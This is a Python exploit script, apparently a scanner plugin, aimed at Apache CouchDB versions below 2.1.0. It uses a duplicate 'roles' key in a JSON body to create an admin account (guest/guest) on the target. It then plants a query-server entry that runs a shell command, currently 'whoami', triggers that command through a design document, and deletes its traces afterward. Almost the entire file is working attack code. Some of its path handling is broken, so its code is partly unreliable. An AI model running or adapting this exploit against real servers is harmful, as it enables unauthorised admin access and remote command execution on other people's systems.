#-*- coding: utf-8 -*-

from requests.auth import HTTPBasicAuth
import requests

def getVersion(host):
    version = requests.get(host).json()["version"]
    return version

user='guest'
password='guest'
cmd = 'whoami'
signal=''

def exploit(version,ifpriv,host):
    with requests.session() as session:
        session.headers = {"Content-Type": "application/json"}

        if ifpriv == 'priv':
            try:
                payload = '{"type": "user", "name": "'
                payload += user
                payload += '", "roles": ["_admin"], "roles": [],'
                payload += '"password": "' + password + '"}'

                pr = session.put(host + "/_users/org.couchdb.user:" + user,
                             data=payload)

                print("[+] User " + user + " with password " + password + " successfully created.")

            except Exception as e:
                msg = str(e)
                print("[-] Unable to create the user on remote host.")
                return False

        session.auth = HTTPBasicAuth(user, password)

        try:
            if version == 1:
                session.put(host + "/_config/query_servers/cmd",
                    data='"' + cmd + '"')
                print("[+] Created payload at: " + host + "/_config/query_servers/cmd")
            else:
                host = session.get(host + "/_membership").json()["all_nodes"][0]
                session.put(host + "/_node/" + host + "/_config/query_servers/cmd",
                    data='"' + cmd + '"')
                print("[+] Created payload at: " + host + "/_node/" + host + "/_config/query_servers/cmd")
        except Exception as e:
            msg = str(e)
            print("[-] Unable to create command payload: " + msg)
            return False

        try:
            session.put(host + "/god")
            session.put(host + "/god/zero", data='{"_id": "HTP"}')
        except Exception as e:
            print("[-] Unable to create the user on remote host.")
            return False

        try:
            if version == 1:
                session.post(host + "/god/_temp_view?limit=10",
                             data='{"language": "cmd", "map": ""}')
            else:
                session.post(host + "/god/_design/zero",
                     data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd"}')
                print("[+] Command executed: " + cmd)
                signal='yes'
        except Exception as e:
            print("[-] Unable to execute payload.")
            return False

        try:
            session.delete(host + "/god")
        except Exception as e:
            print("[-] Unable to remove database.")
            return False

        try:
            if version == 1:
                session.delete(host + "/_config/query_servers/cmd")
            else:
                host = session.get(host + "/_membership").json()["all_nodes"][0]
                session.delete(host + "/_node" + host + "/_config/query_servers/cmd")
        except Exception as e:
            print("[-] Unable to remove payload.")
            return False
        if signal == 'yes':
            return True
        else:
            return False

def verify(protocol,ip,port):
    host = protocol+'://'+ip+':'+str(port)
    print('testing if Apache CouchDB < 2.1.0 Remote Code Execution vul')
    try:
        version = getVersion(host)
        print("[*] Detected CouchDB Version " + version)
        ifpriv='priv'
        vv = version.replace(".", "")
        v = int(version[0])
        if v == 1 and int(vv) <= 170:
            sig = exploit(v,ifpriv,host)
        elif v == 2 and int(vv) < 211:
            sig = exploit(v,ifpriv,host)
        else:
            print("[-] Version " + version + " not vulnerable.")
            sig = False

        if sig and sig == True:
            msg = 'There is Apache CouchDB < 2.1.0 Remote Code Execution vul on url: ' + host + ' .'
            print(msg)
            number = 'v97'
            return True, host, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,host,number,msg
    msg = 'There is no Apache CouchDB < 2.1.0 Remote Code Execution vul'
    number = 'v0'
    return False,host,number,msg














